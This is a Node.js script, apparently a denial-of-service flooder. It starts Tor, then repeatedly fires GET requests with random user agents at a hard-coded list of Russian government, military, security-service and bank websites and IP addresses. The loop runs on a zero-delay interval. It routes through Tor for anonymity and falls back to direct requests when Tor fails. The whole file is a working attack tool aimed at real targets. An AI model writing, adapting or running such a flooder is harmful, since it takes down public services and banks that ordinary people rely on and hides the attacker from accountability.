const tor = require('tor-request');
const request = require('request');
const randomUseragent = require('random-useragent');
const { execFile } = require('child_process');

function sendRequestWithoutProxy(url) {
    request({
        url,
        method: 'GET',
        headers: {
            'User-Agent': randomUseragent.getRandom()
        }
    }, (err, res) => {
        if (err) console.log(err.message);
        if (res?.statusCode) console.log(res.statusCode);
    });
}

const child = execFile('tor', (error) => {
  if (error) throw error;
});

const urls = ["http://duma.gov.ru/", "https://109.207.1.118/", "https://109.207.1.97/", "https://www.nalog.gov.ru", "https://www.sberbank.ru/", "https://www.vtb.ru", "https://www.gazprombank.ru/", "http://president-sovet.ru/", "https://mil.ru/", "https://sovetnational.ru/", "https://www.gosuslugi.ru/ru/", "https://zakupki.gov.ru/epz/main/public/home.html", "https://gossluzhba.gov.ru/", "http://defence.council.gov.ru/", "http://budget.council.gov.ru/", "http://www.kremlin.ru/", "https://government.ru/", "http://www.scrf.gov.ru/", "http://www.ksrf.ru/ru/Pages/default.aspx", "http://www.vsrf.ru/", "http://premier.gov.ru/events/", "https://www.mchs.gov.ru/dokumenty/federalnye-zakony", "https://minjust.gov.ru/ru/", "http://www.fsb.ru/", "https://rosguard.gov.ru/", "https://customs.gov.ru/", "https://udprf.ru/", "http://favt.gov.ru/"]

child.stdout.on('data', async (data)=>{
    if (data.includes('Bootstrapped 100% (done): Done')) {
        try {
            setInterval(() => {
                try {
                    urls.forEach(url => {
                        tor.request({
                            url,
                            method: 'GET',
                            headers: {
                                'User-Agent': randomUseragent.getRandom()
                            }
                        }, (err, res) => {
                            if (err) {
                                console.log(err.message);
                                sendRequestWithoutProxy(url)
                            }
                            if (res?.statusCode) console.log(res.statusCode);
                        })
                    })
                } catch(err) {
                    console.log(err.message)
                }
            })
        } catch(err){
            console.log(err.message)
        }
    }
})




